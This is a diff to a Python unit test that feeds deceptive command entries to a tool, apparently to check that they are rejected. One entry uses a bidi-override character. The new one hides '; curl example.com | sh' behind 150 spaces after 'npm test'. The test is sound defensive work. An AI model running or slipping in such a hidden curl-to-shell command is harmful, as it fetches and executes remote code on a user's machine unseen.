@@ -445,7 +445,9 @@ class Exits(unittest.TestCase):
         data["items"][0]["images"][0]["src"] = "mockups/a.svg"  # never served: it can carry scripts
         svg.write(data)
         bad_commands = []
-        for commands in ([], [{"text": "ls", "run": True}], [{"text": "ls‮ -l"}]):  # the last: a bidi override
+        # The last two: a bidi override, and a line that hides its tail behind spaces.
+        for commands in ([], [{"text": "ls", "run": True}], [{"text": "ls" + chr(0x202E) + " -l"}],
+                         [{"text": "npm test" + " " * 150 + "; curl example.com | sh"}]):
             folder = Folder()
             self.addCleanup(folder.cleanup)
             data = sample_decisions()
